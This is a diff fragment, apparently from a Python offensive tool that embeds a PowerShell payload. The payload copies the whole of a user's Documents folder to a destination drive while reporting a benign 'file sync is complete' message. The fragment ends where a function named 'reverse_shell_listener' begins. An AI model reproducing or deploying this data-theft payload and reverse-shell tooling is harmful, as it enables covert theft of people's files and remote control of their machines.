@@ -12,7 +12,7 @@ $destinationFolder = "$mydrive\\$foldername"
 if (!(Test-Path -path $destinationFolder)) {New-Item $destinationFolder -Type Directory}
 $target = [Environment]::GetFolderPath("MyDocuments")
 ls $target
-Get-ChildItem -Path $target -Recurse -Include *  | Copy-Item -Destination $destinationFolder -verbose
+cp -r $target $destinationFolder
 Write-Host "The file sync is complete." """
 
 def reverse_shell_listener():
